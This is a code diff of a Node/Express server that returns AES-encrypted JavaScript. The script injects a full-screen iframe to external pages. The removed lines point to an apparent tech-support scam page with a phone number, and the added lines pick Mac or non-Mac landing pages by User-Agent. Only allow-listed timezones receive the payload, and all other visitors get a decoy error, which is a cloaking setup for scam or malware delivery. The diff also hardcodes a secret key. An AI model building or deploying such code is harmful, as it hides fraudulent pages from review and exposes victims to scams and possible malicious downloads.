@@ -6,92 +6,106 @@ const app = express();
 const PORT = 3000;
 const secretKey = "2B9IyccRxXwiZctB2LiJFX2pKNedKvwO017H2ii4toIUcF5T3JbmskNEytf";
 
-// --- Middleware ---
 app.use(cors());
 app.use(express.json());
 
-// Optimized Security Headers Middleware
-app.use((req, res, next) => {
-    res.header("Access-Control-Allow-Origin", "*");
-    res.header("Access-Control-Allow-Headers", "Origin, X-Requested-With, Content-Type, Accept");
-    res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
-    
-    if (res.getHeader('X-Frame-Options') === 'sameorigin') {
-        res.removeHeader('X-Frame-Options');
-    }
-    next();
-});
-
-// --- Static Data Configurations ---
-
-// O(1) Instant Lookup Set
-const ALLOWED_TIMEZONES = new Set([
-    "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin"
-]);
-
-// Raw URLs accompanied by their selection probability weights (Must total 1.0)
-const RAW_CONFIGS = [
-    { url: "https://leekoooyy1.on-forge.com/Wi0nHelpSh0errc0de030/index.html?Anph=1-844-590-5369", weight: 1.0 }
-    
-];
-
-// --- Pre-Compilation Cache Layer ---
-// This processes everything into memory ONCE during boot, removing CPU load during requests.
-
-const PRECOMPUTED_RESPONSES = RAW_CONFIGS.map(item => {
-    const rawPayload = `const iframe=document.createElement("iframe");iframe.src="${item.url}";iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");iframe.setAttribute("allowfullscreen","");iframe.setAttribute("webkitallowfullscreen","");iframe.setAttribute("mozallowfullscreen","");iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");iframe.style.width="100%";iframe.style.height="100%";iframe.style.border="0px";const container=document.getElementById("contentiframe");if(container){container.replaceChildren(iframe);}`;
-    
-    return {
-        weight: item.weight,
-        encryptedPayload: encodeURIComponent(CryptoJS.AES.encrypt(rawPayload, secretKey).toString())
-    };
-});
-
-// Pre-encrypt static error payload
-const ERROR_PAYLOAD = encodeURIComponent(CryptoJS.AES.encrypt(`console.log("Error Find");`, secretKey).toString());
-
-// --- Helper Functions ---
-
-/**
- * Returns a pre-encrypted payload immediately using constant-time evaluation 
- * and simple random boundary checks.
- */
-function getFastResponse() {
-    const rand = Math.random();
-    let cumulativeWeight = 0;
-
-    for (const item of PRECOMPUTED_RESPONSES) {
-        cumulativeWeight += item.weight;
-        if (rand <= cumulativeWeight) {
-            return item.encryptedPayload;
-        }
-    }
-    return PRECOMPUTED_RESPONSES[PRECOMPUTED_RESPONSES.length - 1].encryptedPayload;
+// --------------------
+// FAST DEVICE DETECTION
+// --------------------
+function getDeviceType(ua) {
+    if (!ua) return "other";
+    return (ua.includes("Macintosh") || ua.includes("Mac OS")) ? "mac" : "other";
 }
 
-// --- Routes ---
+// --------------------
+// Allowed timezones (Set = fastest lookup)
+// --------------------
+const allowedTimezones = new Set([
+    "Asia/Tokyo", "Australia/Sydney", "Australia/Melbourne", "Australia/Brisbane", "Australia/Adelaide", "Australia/Perth", "Australia/Hobart", "Australia/Darwin",
+    "America/New_York",
+    "America/Chicago",
+    "America/Denver",
+    "America/Los_Angeles",
+    "America/Anchorage",
+    "Pacific/Honolulu",
+    "America/Toronto",
+    "America/Vancouver",
+    "America/Edmonton",
+    "America/Winnipeg",
+    "America/Halifax",
+    "America/St_Johns"
+]);
 
+// --------------------
+// ENCRYPTION (RUNS ONLY ONCE)
+// --------------------
+function aesEncode(text) {
+    return CryptoJS.AES.encrypt(text, secretKey).toString();
+}
+
+// --------------------
+// PRE-COMPILED PAYLOADS (KEY OPTIMIZATION)
+// --------------------
+const LINKS = {
+    mac: "https://main.d1eosi23diktir.amplifyapp.com/mac",
+    other: "https://main.d1eosi23diktir.amplifyapp.com/"
+};
+
+// Build iframe scripts ONCE
+function buildIframe(url) {
+    return encodeURIComponent(aesEncode(
+        'const iframe=document.createElement("iframe");' +
+        'iframe.src="' + url + '";' +
+
+        'iframe.setAttribute("allow","fullscreen; autoplay; encrypted-media; picture-in-picture");' +
+        'iframe.setAttribute("allowfullscreen","");' +
+        'iframe.setAttribute("webkitallowfullscreen","");' +
+        'iframe.setAttribute("mozallowfullscreen","");' +
+
+        'iframe.setAttribute("sandbox","allow-scripts allow-popups allow-forms allow-downloads");' +
+
+        'iframe.style.width="100%";' +
+        'iframe.style.height="100%";' +
+        'iframe.style.border="0";' +
+
+        'document.getElementById("contentiframe").replaceChildren(iframe);'
+    ));
+}
+
+// PRE-COMPILED RESPONSES (NO CRYPTO DURING REQUESTS)
+const PRECOMPILED_RESPONSE = {
+    mac: buildIframe(LINKS.mac),
+    other: buildIframe(LINKS.other),
+    error: encodeURIComponent(aesEncode(`console.log("Error Find");`))
+};
+
+// --------------------
+// ROUTES (EXTREMELY FAST NOW)
+// --------------------
 app.get("/timezone", (req, res) => {
     res.status(401).json({
         status: "error",
-        message: "Unauthorized access",
-        response: ERROR_PAYLOAD
+        message: "404 Error",
+        response: PRECOMPILED_RESPONSE.error
     });
 });
 
 app.post("/timezone", (req, res) => {
     const { timezone } = req.body;
 
-    // Fast validations against memory references 
-    if (timezone && ALLOWED_TIMEZONES.has(timezone)) {
-        res.send(getFastResponse());
+    const ua = req.get("User-Agent") || "";
+    const deviceType = getDeviceType(ua);
+
+    if (allowedTimezones.has(timezone)) {
+        res.send(PRECOMPILED_RESPONSE[deviceType] || PRECOMPILED_RESPONSE.other);
     } else {
-        res.send(ERROR_PAYLOAD);
+        res.send(PRECOMPILED_RESPONSE.error);
     }
 });
 
-// --- Start Server ---
+// --------------------
+// START SERVER
+// --------------------
 app.listen(PORT, () => {
-    console.log(`High-performance server running on port ${PORT}`);
+    console.log(`Server running on http://localhost:${PORT}`);
 });
-
